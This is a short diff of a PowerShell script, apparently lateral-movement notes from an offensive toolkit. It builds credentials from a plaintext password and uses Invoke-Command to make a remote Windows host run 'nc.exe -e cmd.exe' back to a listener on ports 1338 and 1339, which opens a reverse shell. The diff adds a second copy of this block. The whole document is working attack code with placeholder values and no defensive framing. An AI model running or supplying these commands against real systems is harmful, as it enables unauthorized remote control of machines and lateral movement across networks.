@@ -3,3 +3,9 @@ $cred = New-Object System.Management.Automation.PSCredential ('hostname\username
 Invoke-Command -ComputerName hostname -Credential $cred -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 0.0.0.0 1338 }
 
 
+$username = 'hostname\user'
+$password = 'pass'
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Invoke-Command -ComputerName hostaname -Credential $credential -ScriptBlock { C:\windows\temp\nc.exe -e cmd.exe 0.0.0.0 1339 }
